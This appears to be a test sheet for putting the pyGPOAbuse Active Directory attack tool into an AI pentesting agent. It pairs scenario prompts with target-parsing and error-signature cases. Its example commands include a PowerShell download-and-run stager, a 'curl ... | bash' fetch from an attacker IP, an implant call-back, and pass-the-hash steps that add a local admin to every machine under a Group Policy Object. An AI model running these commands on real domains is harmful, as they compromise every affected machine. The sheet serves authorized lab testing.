# pygpoabuse — Tier A scenarios

Single test sheet for the `pygpoabuse` tool migration (Wave 4.4 — fourth and
final tool of Wave 4, AD post-exploitation cluster after netexec, certipy,
and bloodyad).

pyGPOAbuse is a single Python script (`/opt/pygpoabuse/pygpoabuse.py`) wrapped
by a `/usr/local/bin/pygpoabuse` shell wrapper that does
`exec python3 /opt/pygpoabuse/pygpoabuse.py "$@"`. The binary name is
LOWERCASE `pygpoabuse` — different from the upstream repo name CamelCase
`pyGPOAbuse` (Hackndo/pyGPOAbuse).

Argv form:
```
pygpoabuse <domain/user[:password]>
           -gpo-id <GUID>|<-gpo-name 'NAME'>
           -command "<cmd>"
           [-dc-ip <IP>] [-hashes :NTHASH] [-k -ccache <path>]
           [-taskname <NAME>] [-description <DESC>] [-mod-date <DATE>]
           [-powershell] [-ldaps] [-user|-user-as-admin] [-f] [-v|-vv]
           [--cleanup]
```

The tool abuses GPO write rights (GenericAll / GenericWrite / WriteDacl on a
GPO container) by injecting an Immediate Scheduled Task into the GPO's
machine or user policy segment. The task runs as SYSTEM (default) on every
computer the GPO applies to, during the next Group Policy refresh (default
~90 min, can be forced with `gpupdate /force` on the target client via
impacket-atexec).

**Two key non-obvious facts (SKILL #5 — match vendor reality)**:
1. The first positional is a CREDENTIAL BLOB (`domain/user:password`), NOT a
   DC IP. The DC is supplied via `-dc-ip` separately.
2. Most multi-character long flags use SINGLE dash (impacket convention):
   `-gpo-id`, `-gpo-name`, `-dc-ip`, `-hashes`, `-taskname`, `-description`,
   `-mod-date`, `-command`, `-powershell`, `-ldaps`, `-ccache`, `-user`,
   `-user-as-admin`. Only `--cleanup` and the Linux-Samba options
   (`--linux-exec`, `--linux-args`, `--linux-run-as`) use double-dash.

Sections:
1. Recommended HTB box for live verification
2. Narrative scenarios (paste into opensploit)
3. Target-extraction adversarial cases (≥20 — total 22)
4. Failure-signature live-verify cases (≥3 — total 6)
5. Open questions
6. Hand-off

---

## 1. Recommended HTB box

**Hercules (10.129.242.196)** — listed in registry as the canonical AD lab
box for ACL/RBCD/shadow-credentials operations. Verify availability for the
wave since HTB rotates retired boxes.

**CRITICAL CAVEAT — pygpoabuse needs a writable GPO**: unlike bloodyAD's
read-only enumeration paths (`get writable`, `get search`), pygpoabuse has
NO read-only mode — every invocation writes to SYSVOL. The lab box must be
deliberately misconfigured so the test user has GenericAll / GenericWrite /
WriteDacl on at least one GPO container. Confirm with bloodyAD first:

```
bloodyAD --host <DC> -d corp.local -u <user> -p '<pass>' get writable --otype GPO
```

If no writable GPO appears, pygpoabuse is not testable on that box. Document
the result; defer live verification to a box that does have a writable GPO.

**Boxes that historically had GPO-friendly ACL paths:**
- **Hercules** — canonical (current registry entry); GPO write status pending verify.
- **Sizzle** — retired; had a writable GPO via Account Operators membership.
- **Forest** — retired; DCSync via Exchange Trusted Subsystem (different attack class, not GPO).

**Documented gap (Open Question 6)**: pygpoabuse target_extraction and
command-shape audits are done via plugin unit tests (no DC needed). Runtime
behaviour is verified post-pilot against Hercules during Wave 9 batch
rebuild — IF Hercules has a writable GPO. Otherwise the live-verify is
deferred to a custom AD lab.

**Persistent test directory**: mount `/tmp/pygpoabuse-test:/session` (per
SKILL #14). Multi-step flows (impacket-getTGT → pygpoabuse with -k -ccache →
impacket-atexec gpupdate /force → verify SYSTEM RCE) need the same working
dir across calls so the ccache and any captured proof file are visible to
the next invocation.

---

## 2. Narrative scenarios (paste into opensploit)

### S1 — Standard GPO abuse with whoami payload (smoke test)

```
Engagement target: <DC IP> with valid AD credentials and CONFIRMED GenericAll on GPO {<GUID>} (authorized AD lab).
Use pygpoabuse 'corp.local/auditor:P@ss123' -dc-ip <DC IP> -gpo-id {<GUID>} -command 'cmd /c whoami > C:\Windows\Temp\opensploit-proof.txt' to inject an Immediate Scheduled Task that writes whoami output to a file on every computer the GPO applies to. After GP refresh (or impacket-atexec gpupdate /force on a target client), verify the proof file exists.
```

**Watch:** target=`corp.local` extracted via `positional_match` rule 2
(domain part of the credential blob). The DC IP `<DC IP>` is supplied via
`-dc-ip` (rule 1) — `flag_value` precedence wins, so target=`<DC IP>`. The
GPO GUID `{<GUID>}` has curly braces and dots — must NOT be picked as a
target (no positional rule for raw GUIDs). The PowerShell-y filename
`C:\Windows\Temp\opensploit-proof.txt` contains a colon — must NOT match
URL-host extraction.

### S2 — Pass-the-hash GPO abuse

```
Engagement target: <DC IP> with NT hash via secretsdump (authorized AD lab).
Use pygpoabuse 'corp.local/auditor' -hashes ':<NT_HASH>' -dc-ip <DC IP> -gpo-id {<GUID>} -command 'net localgroup administrators pwn /add' to inject a task that adds a local admin on every machine the GPO applies to.
```

**Watch:** target=`<DC IP>` (via -dc-ip flag_value, rule 1). The credential
blob `corp.local/auditor` has NO password (no `:`). The `-hashes` value is
`:<NT_HASH>` — leading colon for empty LM half. The `:` inside the -hashes
value is INSIDE a flag value and must NOT be parsed as a credential
separator.

### S3 — Kerberos pass-the-ticket GPO abuse

```
Engagement target: dc01.corp.local (FQDN — required for Kerberos SPN resolution; authorized AD lab). KRB5CCNAME pre-set; ccache at /session/credentials/auditor.ccache.
Use pygpoabuse 'corp.local/auditor' -k -ccache /session/credentials/auditor.ccache -dc-ip dc01.corp.local -gpo-id {<GUID>} -command 'powershell.exe -enc <BASE64>' -powershell to bind via Kerberos and push a PowerShell payload.
```

**Watch:** target=`dc01.corp.local` extracted via `-dc-ip` flag_value. The
credential blob has no password and no hash — auth is via the ccache. The
`-k` flag is BARE BOOLEAN (does NOT take a value); `-ccache` carries the
path. NB: pyGPOAbuse argparse exits 1 if `-k` without `-ccache` (different
from bloodyAD's KRB5CCNAME auto-discovery — pyGPOAbuse requires explicit
`-ccache`).

### S4 — PowerShell payload via -command + -powershell wrapper

```
Engagement target: <DC IP> (authorized AD lab).
Use pygpoabuse 'corp.local/auditor:P@ss123' -dc-ip <DC IP> -gpo-id {<GUID>} -powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/stager.ps1')" to push an IEX downloader payload that fetches a stager from the attacker's HTTP server.
```

**Watch:** target=`<DC IP>` via -dc-ip. The `-powershell` flag is BARE
BOOLEAN — wraps the -command value in `powershell.exe -nop -w hidden -c
...`. The -command value contains a URL `http://10.10.14.5/stager.ps1` —
must NOT be picked as a target (no URL-host rule applies; it's inside a
quoted -command value). NB: the spec mentioned `-powershell <PS-FILE>` —
that's WRONG; upstream pyGPOAbuse has no PS-file flag. The PS code goes
inline via -command.

### S5 — Failure: wrong GPO ID, insufficient access

```
Engagement target: <DC IP> with low-priv creds (authorized AD lab). Auditor does NOT have write rights on GPO {<INVALID-GUID>}.
Use pygpoabuse 'corp.local/auditor:P@ss123' -dc-ip <DC IP> -gpo-id {<INVALID-GUID>} -command 'whoami' to attempt a GPO write that should fail with a permission error.
```

**Watch:** target=`<DC IP>`. Output should contain `doesn't seem to have the
necessary rights` or `STATUS_ACCESS_DENIED` (depending on whether LDAP-side
or SMB-side rights fail). Failure classified via signature.

### S6 — Cleanup — roll back the scheduled task and GPO version

```
Engagement target: <DC IP> with valid AD credentials AND a previously-injected task to remove (authorized AD lab).
Use pygpoabuse 'corp.local/auditor:P@ss123' -dc-ip <DC IP> -gpo-id {<GUID>} -taskname 'TASK_abc123' --cleanup to remove the previously-pushed Immediate Scheduled Task and roll back the GPO version number.
```

**Watch:** target=`<DC IP>`. `--cleanup` is one of only two double-dash
flags (the other being --linux-exec family). Must be DOUBLE-dash —
`-cleanup` would be an unrecognized argument. The taskname must match the
one returned during scheduled_task creation.

### S7 — User-context GPO (logon-time task)

```
Engagement target: <DC IP> with valid AD credentials and write on a User-OU-linked GPO (authorized AD lab).
Use pygpoabuse 'corp.local/auditor:P@ss123' -dc-ip <DC IP> -gpo-id {<GUID>} -user -command '%USERPROFILE%\AppData\Local\opensploit-user-proof.txt' to inject a user-context task that runs at user logon as the user (NOT SYSTEM).
```

**Watch:** target=`<DC IP>`. `-user` is BARE BOOLEAN — switches from
default computer GPO to user GPO. Task runs at user logon, in the user's
context. Different from `-user-as-admin` which is user-targeted but runs as
SYSTEM.

### S8 — failure: DNS unreachable

```
Engagement target: pygpoabuse 'corp.local/auditor:P@ss123' -dc-ip invalid-dc-name.invalid.localdomain -gpo-id {<GUID>} -command 'whoami' (deliberately wrong DC).
```

**Watch:** target=`invalid-dc-name.invalid.localdomain` extracted via
-dc-ip. DNS lookup fails; output contains `Could not resolve` or `Name or
service not known`. Failure classified via signature.

### S9 — failure: connection refused (TCP layer)

```
Engagement target: pygpoabuse 'corp.local/auditor:P@ss123' -dc-ip 127.0.0.1 -gpo-id {<GUID>} -command 'whoami' (intentionally wrong target — no SMB/LDAP on localhost).
```

**Watch:** target=`127.0.0.1`. SMB TCP connect to 445 fails with
`Connection refused`. Failure classified.

---

## 3. Target-extraction adversarial cases (22 total, ≥20 spec)

The pygpoabuse `tool.yaml` declares TWO `target_extraction` rules (first
match wins):

1. `flag_value` for `-dc-ip` (parse_as: raw) — most explicit, REQUIRED for
   most ops.
2. `positional_match` regex `^([A-Za-z0-9][A-Za-z0-9.-]*)/[^/:@]+(?::[^@]+)?$`
   group 1 — extracts the `<domain>` subcomponent of the credential blob
   `domain/user[:password]`. Used when -dc-ip is omitted and DNS resolves
   the domain to a DC.

NO raw `first_non_flag_positional` rule — that would put a CREDENTIAL into
the engagement scope log (security leak). The regex isolates only the
domain part.

`value_flags` declares ~22 entries — every flag whose value could shape-match
a host (`-dc-ip`, `-gpo-id`, `-gpo-name`, `-hashes`, `-taskname`,
`-description`, `-mod-date`, `-command`, `-ccache`, `--linux-exec`,
`--linux-args`, `--linux-run-as`) plus boolean flags listed defensively
(`-k`, `-f`, `-v`, `-powershell`, `-user`, `-user-as-admin`, `-ldaps`,
`--cleanup`).

### Happy-path cases — flag_value extraction

| #  | Command (binary `pygpoabuse` omitted) | Expected target | Notes |
|----|---|---|---|
| 1  | `'corp.local/auditor:P@ss123' -dc-ip 10.10.10.5 -gpo-id '{31B2F340-016D-11D2-945F-00C04FB984F9}' -command 'whoami'` | `10.10.10.5` | basic -dc-ip (rule 1) — rule 1 wins over rule 2's `corp.local` |
| 2  | `'corp.local/auditor:P@ss123' -dc-ip dc01.corp.local -gpo-id '{GUID}' -command 'whoami'` | `dc01.corp.local` | -dc-ip with FQDN |
| 3  | `'corp.local/auditor:P@ss123' -gpo-id '{GUID}' -command 'whoami'` | `corp.local` | -dc-ip omitted → rule 2 picks domain part of credential blob |
| 4  | `'CONTOSO/jdoe' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 192.168.10.5 -gpo-id '{GUID}' -command 'whoami'` | `192.168.10.5` | PtH; -dc-ip wins |
| 5  | `'corp.local/auditor' -k -ccache /session/credentials/auditor.ccache -dc-ip dc01.corp.local -gpo-id '{GUID}' -command 'whoami'` | `dc01.corp.local` | Kerberos; -dc-ip wins |
| 6  | `'corp.local/auditor:P@ss123' -dc-ip 10.10.10.5 -gpo-name 'Default Domain Controllers Policy' -command 'whoami'` | `10.10.10.5` | -gpo-name with spaces; quoted; -dc-ip wins |
| 7  | `'corp.local/auditor:P@ss123' -dc-ip 10.10.10.5 -gpo-id '{GUID}' -taskname 'WindowsUpdateMaintenance' -description 'Routine maintenance' -command 'whoami'` | `10.10.10.5` | -taskname + -description with whitespace; values consumed by value_flags |
| 8  | `'corp.local/auditor:P@ss123' -dc-ip 10.10.10.5 -gpo-id '{GUID}' --cleanup -taskname 'TASK_abc'` | `10.10.10.5` | --cleanup is double-dash boolean; doesn't break extraction |

### Adversarial — value-flag traps (FQDN/IP-shape values that could be picked)

| #  | Command | Expected | Notes |
|----|---|---|---|
| 9  | `'corp.local/auditor@corp.local:P@ss123' -dc-ip 10.10.10.5 -gpo-id '{GUID}' -command 'whoami'` | `10.10.10.5` | UPN form `auditor@corp.local` inside credential blob; the `@` is INSIDE the credential — regex `(?::[^@]+)?$` does NOT match because the `@` is BEFORE `:`. Falls through; rule 1 wins. |
| 10 | `'corp.local/auditor:P@ss123!' -dc-ip 10.10.10.5 -gpo-id '{31B2F340-016D-11D2-945F-00C04FB984F9}' -command 'cmd /c whoami > C:\\proof.txt'` | `10.10.10.5` | Password contains `@` and `!`; regex `(?::[^@]+)?$` would not match if `@` is in password — but rule 1 `-dc-ip` wins first, so unaffected. |
| 11 | `'corp.local/auditor:P@ss123' -dc-ip 10.10.10.5 -gpo-id '{GUID}' -command 'curl http://10.10.14.5/payload.sh \| bash'` | `10.10.10.5` | -command value contains a URL with IP `10.10.14.5` — but it's INSIDE -command flag value, not a positional. rule 1 wins. |
| 12 | `'corp.local/auditor:P@ss123' -dc-ip 10.10.10.5 -gpo-id '{31B2F340-016D-11D2-945F-00C04FB984F9}' -command 'net localgroup administrators pwn /add'` | `10.10.10.5` | -gpo-id value `{31B2F340-...-00C04FB984F9}` is a GUID with dots and curly braces — must NOT match (not a host shape, and inside a value_flag). |
| 13 | `'corp.local/auditor' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.5 -gpo-id '{GUID}' -command 'whoami'` | `10.10.10.5` | -hashes value `:31d6cfe0...` has leading colon and 32 hex chars — must NOT match URL-host or any positional pattern. |
| 14 | `'corp.local/auditor:P@ss123' -dc-ip 10.10.10.5 -gpo-id '{GUID}' -mod-date '2024-01-15T10:30:00' -command 'whoami'` | `10.10.10.5` | -mod-date value contains colons (timestamp); INSIDE value_flag, not picked. |
| 15 | `'corp.local/auditor:P@ss123' -dc-ip 10.10.10.5 -gpo-id '{GUID}' -ccache /session/credentials/auditor@CORP.LOCAL.ccache -k -command 'whoami'` | `10.10.10.5` | -ccache value contains `@CORP.LOCAL` (UPN-style realm in path) — INSIDE value_flag, not picked. |
| 16 | `'corp.local/auditor:P@ss123' -dc-ip 10.10.10.5 -gpo-name 'Workstations - Internet Explorer Hardening' -command 'whoami'` | `10.10.10.5` | -gpo-name with multiple spaces and a dash — quoted as one argv token; INSIDE value_flag. |
| 17 | `'corp.local/auditor:P@ss123' -dc-ip 10.10.10.5 -gpo-id '{GUID}' --linux-exec /session/payloads/implant --linux-args '--port 4444 --host 10.10.14.5' --linux-run-as root` | `10.10.10.5` | --linux-args value contains `--host 10.10.14.5` (IP-shape inside the args string) — INSIDE value_flag, not picked. |

### Adversarial — security invariants & ambiguity

| #  | Command | Expected | Notes |
|----|---|---|---|
| F1 | `--help` | `target=null` | Top-level help. Tool runner bypasses scope. |
| F2 | `-h` | `target=null` | Short alias. |
| F3 | `'corp.local/auditor:P@ss123' -gpo-id '{GUID}' -command 'whoami'` | `corp.local` | -dc-ip omitted; falls through to rule 2 (regex domain extraction). The auth user's domain becomes the implicit DC target. |
| F4 | `'10.10.10.5/auditor:P@ss123' -gpo-id '{GUID}' -command 'whoami'` | `10.10.10.5` | Edge case: domain part of credential blob is an IP (unusual but valid syntactically). Regex matches; group 1 is `10.10.10.5`. **Security note**: rare in production. |
| F5 | `'/auditor:P@ss123' -dc-ip 10.10.10.5 -gpo-id '{GUID}' -command 'whoami'` | `10.10.10.5` | Edge case: empty domain part — pyGPOAbuse will exit `Domain should be specified!`, but extraction picks rule 1 -dc-ip. Argparse-time failure, extraction-time success. |
| F6 | `'corp.local/auditor' -k -dc-ip 10.10.10.5 -gpo-id '{GUID}' -command 'whoami'` | `10.10.10.5` | `-k` without `-ccache` — pyGPOAbuse exits 1 at runtime. Extraction succeeds. |
| F7 | `'corp.local/auditor:P@ss123' -dc-ip 10.10.10.5 -gpo-id '{GUID1}' -gpo-name 'BadGPO' -command 'whoami'` | `10.10.10.5` | argparse mutually-exclusive violation — pyGPOAbuse exits 2. Extraction succeeds. |
| F8 | `'corp.local/auditor:P@ss123' -dc-ip 10.10.10.5 -command 'whoami'` | `10.10.10.5` | argparse: missing required mutually-exclusive group (-gpo-id/-gpo-name). Extraction succeeds. |
| F9 | `'corp.local/auditor:P@ss123' --dc-ip 10.10.10.5 -gpo-id '{GUID}' -command 'whoami'` | `corp.local` | TYPO: `--dc-ip` (DOUBLE dash) is wrong; argparse rejects it as `unrecognized arguments`. Rule 1 doesn't fire (no `-dc-ip` match), so rule 2 kicks in and picks domain part. **Security invariant**: extraction behaves consistently even when argparse will reject the command. |

(Total: 22 cases, ≥20 spec — 8 happy + 9 adversarial value-flag cases + 9
help/security-invariant cases. Some help variants combined.)

---

## 4. Failure-signature live-verify cases (6 total, ≥3 spec)

Verify against the pygpoabuse container (rebuild during Wave 9 batch with
mcp-common 0.3.0 and python3-full base — Dockerfile fix landed today).

Layer diversity (SKILL #11) — 8 distinct verifiable layers represented in
`tool.yaml`'s `failure_signatures`. Live-verify the most common 6 below.

| # | Layer | Test | failure_signature `signal` | Status |
|---|---|---|---|---|
| 1 | DNS | `pygpoabuse 'corp.local/u:p' -dc-ip nonexistent.invalid -gpo-id '{GUID}' -command 'whoami'` | `Could not resolve` OR `Name or service not known` | PENDING live verify (Wave 9) |
| 2 | TCP | `pygpoabuse 'corp.local/u:p' -dc-ip 127.0.0.1 -gpo-id '{GUID}' -command 'whoami'` (no SMB on localhost) | `Connection refused` | PENDING live verify |
| 3 | SMB bind / NTLM | `pygpoabuse 'corp.local/nonexistent:wrong' -dc-ip <DC IP> -gpo-id '{GUID}' -command 'whoami'` | `STATUS_LOGON_FAILURE` | PENDING live verify (needs DC) |
| 4 | SMB write (SYSVOL) | `pygpoabuse 'corp.local/low-priv:p' -dc-ip <DC IP> -gpo-id '{<NO-WRITE-GUID>}' -command 'whoami'` (LDAP succeeds, SYSVOL write rejected) | `STATUS_ACCESS_DENIED` OR `doesn't seem to have the necessary rights` | PENDING live verify |
| 5 | argparse | `pygpoabuse 'corp.local/u:p' -dc-ip <DC IP> -command 'whoami'` (missing required -gpo-id/-gpo-name) | `one of the arguments` OR `argument required` | PENDING live verify (no DC needed) |
| 6 | pygpoabuse-specific | `pygpoabuse 'auditor:P@ss123' -dc-ip <DC IP> -gpo-id '{GUID}' -command 'whoami'` (missing domain part of credential blob) | `Domain should be specified` | PENDING live verify (no DC needed) |

### Layer diversity (SKILL #11) — achieved

8 distinct verifiable layers documented in `failure_signatures`:
1. **DNS** (case 1 — `Could not resolve`, `Name or service not known`)
2. **TCP** (case 2 — `Connection refused`, `connection error`)
3. **SMB bind / NTLM auth** (case 3 — `STATUS_LOGON_FAILURE`, `Wrong hash format`)
4. **SMB write (SYSVOL)** (case 4 — `STATUS_ACCESS_DENIED`, `STATUS_INVALID_HANDLE`, `Unable to connect`)
5. **LDAP / GPO modify** (`doesn't seem to have the necessary rights`,
   `Error while updating versions`, `permission denied`, `not authorized`,
   `Error while cleaning`)
6. **Kerberos** (`KRB_AP_ERR_SKEW`, `Clock skew too great`,
   `KDC_ERR_PREAUTH_FAILED`, `ccache required`)
7. **Argparse** (`argument required`, `unrecognized arguments`,
   `one of the arguments`, `not allowed with argument`)
8. **pyGPOAbuse-specific** (`Wrong hash format`, `Domain should be specified`,
   `Could not find a GPO named`, `Does not exist`)

### Signals encoded but not yet live-verified

`STATUS_INVALID_HANDLE`, `Unable to connect`, `Does not exist`,
`Error while updating versions`, `Error while cleaning`, `KRB_AP_ERR_SKEW`,
`Clock skew too great`, `KDC_ERR_PREAUTH_FAILED`, `ccache required`,
`one of the arguments`, `not allowed with argument`,
`Could not find a GPO named`.

These exercise post-pilot when a working AD lab with a writable GPO is
reachable (Open Question 6).

---

## 5. Open questions

1. **Target-positional-vs-dc-ip precedence** — both rules can fire if the
   credential blob has a domain part AND `-dc-ip` is set. Verified that
   rule 1 (`flag_value` -dc-ip) wins over rule 2 (`positional_match` domain
   regex) by declared order. **Caveat**: when `-dc-ip` is omitted but the
   domain part of the credential blob is an IP (rare but legal), rule 2
   correctly extracts the IP. Document: prefer explicit `-dc-ip` literals
   over relying on credential blob's domain DNS resolution.

2. **GPO discovery workflow — pre-flight requirement** — pygpoabuse has NO
   built-in GPO discovery (no list-writable-GPOs subcommand). The agent
   MUST query bloodyAD or BloodHound first to identify a writable GPO and
   its GUID before invoking pygpoabuse. Document the canonical pre-flight
   in routing/use_for. Long-term: consider a wrapper tool (`gpo-find`) that
   chains `bloodyAD ... get writable --otype GPO` → pygpoabuse.

3. **Cleanup automation — non-atomic semantics** — `--cleanup` rolls back
   the SYSVOL XML and GPO version, but if the task already fired on some
   clients, per-client artefacts (Task Scheduler entries) remain. There's
   no built-in mechanism to enumerate and clean up per-client. Document the
   non-atomic semantics in gotchas. Long-term: pair with impacket-atexec /
   netexec smb -x 'schtasks /delete /TN <name> /F' for full per-client
   cleanup.

4. **Alternate to forcing gpupdate** — without `gpupdate /force` on a
   target client, the injected task waits ~90 min for the next GP refresh.
   The agent has limited remote control over GP refresh timing. Options:
   (a) impacket-atexec / netexec smb to push `gpupdate /force` if the user
   has SMB exec rights on the client; (b) wait for natural refresh
   (impractical for engagements). Document in gotchas. Long-term: consider
   chaining impacket-atexec gpupdate as a post-step in a recipe.

5. **KRB5CCNAME plumbing for `-k` Kerberos auth** — UNLIKE bloodyAD's
   auto-discovery, pyGPOAbuse REQUIRES explicit `-ccache /path/to/file.ccache`
   and does NOT consult the KRB5CCNAME env var. Documented as gotcha. The
   agent must pass the ccache path explicitly. Long-term: consider a
   plugin-side `inherit_env` feature to translate KRB5CCNAME → -ccache
   automatically — but per-tool semantic shaping is plugin scope creep.
   Defer.

6. **HTB lab availability for live verify** — Hercules is the canonical AD
   lab in the registry but pygpoabuse needs a deliberately misconfigured
   ACL: the auth user must have GenericAll/GenericWrite/WriteDacl on at
   least one GPO container. Verify by running bloodyAD `get writable
   --otype GPO` first. If no writable GPO appears, defer live verify to a
   custom AD lab. Documented as known gap.

7. **Spec hallucinations — phantom flags** — the migration spec mentioned
   `-author <AUTHOR>`, `-execution-time <TIME>`, and `-powershell <PS-FILE>`
   as common flags. Verified against upstream pyGPOAbuse cli.py:
   - `-author` does NOT exist (task author is hardcoded as NT AUTHORITY\\SYSTEM via the task XML template).
   - `-execution-time` does NOT exist (execution is implicitly "immediate" — the task is an Immediate Scheduled Task type, fires at next GP refresh).
   - `-powershell` is a BARE BOOLEAN, NOT `-powershell <FILE>`. PS code
     goes via `-command` as a single string; -powershell wraps it in
     `powershell.exe -nop -w hidden -c ...`.
   Tool.yaml omits these phantom flags and explicitly documents them in
   gotchas. SKILL #5 — match vendor reality.

8. **Stateful ccache restore for legacy methods (mcp-server.py auto-discovery)** —
   the legacy MCP path does NOT auto-restore ccache (unlike bloodyAD's
   `_restore_state`). Both kind:cli and legacy method paths require the
   agent to pre-stage the ccache. Documented in gotchas.

9. **Dash-convention error patterns** — `--gpo-id` (double-dash) or
   `-DC-ip` (wrong case) both produce argparse errors. The single-dash
   long-form impacket convention is critical for pygpoabuse. Documented in
   gotchas as a common LLM mistake pattern.

10. **Kerberos clock skew on kind:cli** — pygpoabuse's Dockerfile retains
    libfaketime (verify after python3-full migration). Kerberos clock
    skew is a frequent failure on hardened AD targets (KRB_AP_ERR_SKEW).
    Verify libfaketime survives the Dockerfile fix — should, since
    libfaketime is a separate apt package. (Same as bloodyad / netexec /
    certipy Open Question 10.)

---

## 6. Hand-off

- **Tool**: pygpoabuse (kind:cli, single binary `pygpoabuse` LOWERCASE
  via `/usr/local/bin/pygpoabuse` shell wrapper that execs
  `python3 /opt/pygpoabuse/pygpoabuse.py`). Single-action architecture:
  `pygpoabuse <credential_blob> -gpo-id <GUID> -command <cmd> [...]` plus
  `--cleanup` rollback variant. Linux Samba AD branch
  (`--linux-exec`/`--linux-args`/`--linux-run-as`) is a separate code
  path.
- **Status**: tool.yaml authored end-to-end (kind:mcp methods PRESERVED
  + kind:cli sections ADDED on top); scenarios.md written.
  **Dockerfile EDITED** — `python3 / python3-pip / python3-venv` replaced
  with `python3-full` (Kali-rolling-friendly per nikto / impacket / ffuf
  / nuclei / git-dumper / ssti / netexec / certipy / bloodyad
  convention). **Wrapper ADDED** — `/usr/local/bin/pygpoabuse` shell
  script that does `exec /usr/bin/python3 /opt/pygpoabuse/pygpoabuse.py
  "$@"` (similar to ssti's sstimap wrapper). The Hackndo/pyGPOAbuse repo
  ships only `pygpoabuse.py` — no PATH-installed entry point — so the
  wrapper is required for `binary: pygpoabuse` to resolve.
- **mcp-server.py UNTOUCHED** — auto-inherits `run_cli` from
  BaseMCPServer (mcp-common 0.3.0); existing 2 method handlers
  (scheduled_task, cleanup) preserved as the legacy / rollback path per
  SKILL #21. The methods carry output classification (`failure_indicators`
  / `has_success` / `has_failure` heuristics in mcp-server.py lines
  188-201, 247-251) that's NOT reconstructible from raw stdout under
  run_cli. Agents that want classified errors call
  `mcp_tool pygpoabuse scheduled_task ...` rather than
  `cli_in_container pygpoabuse ...`. Both paths coexist.
- **Image**: `ghcr.io/silicon-works/mcp-tools-pygpoabuse:latest` —
  needs rebuild during Wave 9 batch to pick up mcp-common 0.3.0 AND
  the python3-full base AND the new `/usr/local/bin/pygpoabuse`
  wrapper. Image size unchanged (~300 MB).
- **target_extraction = TWO rules**: rule 1 `flag_value` for `-dc-ip`
  (most explicit). Rule 2 `positional_match` regex extracting the
  `<domain>` subcomponent of the credential blob (when -dc-ip is
  omitted). NO raw `first_non_flag_positional` — that would put a
  CREDENTIAL into engagement scope (security leak).
- **value_flags**: ~22 entries — every auth flag (`-dc-ip`, `-hashes`,
  `-ccache`, plus boolean `-k`, `-ldaps`), every GPO targeting flag
  (`-gpo-id`, `-gpo-name`), every payload flag (`-command`, `-taskname`,
  `-description`, `-mod-date`, plus boolean `-powershell`, `-user`,
  `-user-as-admin`, `-f`), the `--cleanup` boolean (double-dash anomaly),
  and the Linux Samba AD options (`--linux-exec`, `--linux-args`,
  `--linux-run-as`).
- **reject_flags**: EMPTY — pygpoabuse has no bulk-target ingest flag.
  Single-target tool — one DC + one GPO + one task per call.
- **allow_multi_target: false** — pygpoabuse targets a single DC and
  single GPO per call. Multi-DC / multi-GPO via repeated calls.
- **Wave 4.4**: fourth and final tool of Wave 4 (AD post-exploitation
  cluster). Tier A migration progress: 18 tools done after this (curl,
  sqlmap, impacket, nmap, ffuf, nuclei, nikto, john, hashcat, kerbrute,
  hydra, ssti, git-dumper, netexec, certipy, bloodyad,
  pygpoabuse).
- **Vendor-reality enforcement (SKILL #5)** — caller migration spec
  contained THREE phantom flags (`-author`, `-execution-time`,
  `-powershell <PS-FILE>`) that don't exist in upstream
  Hackndo/pyGPOAbuse. Tool.yaml omits all three and documents the
  hallucinations in gotchas + Open Question 7.
- **DASH CONVENTION IS IMPACKET-STYLE** — most multi-character long
  flags use SINGLE dash: `-gpo-id`, `-gpo-name`, `-dc-ip`, `-hashes`,
  `-taskname`, `-description`, `-mod-date`, `-command`, `-ccache`,
  `-powershell`, `-ldaps`, `-user`, `-user-as-admin`. EXCEPTIONS:
  `--cleanup`, `--linux-exec`, `--linux-args`, `--linux-run-as`.
  Documented as the most important fact for agents to internalize.
- **CREDENTIAL BLOB FIRST POSITIONAL** — `domain/user[:password]`
  (impacket parse_credentials), NOT a hostname. The DC is
  `-dc-ip`. This is the SECOND most important fact for agents
  internalize.
- **Files removed**: NONE existing — `__pycache__/` not present;
  `target_extraction_tests.md` and `failure_signature_tests.md` never
  existed. Directory was already on the simpler layout.
- **Live-verify pending**: paste S1-S9 against an AD lab with a
  writable GPO during Wave 9 batch rebuild + e2e run. Verify failure
  signatures 1-6 live; verify target-extraction cases 1-17 + F1-F9
  with plugin unit tests (no DC needed for target_extraction unit
  tests — pure command-shape parsing).

Authored: 2026-04-25 (Wave 4.4).
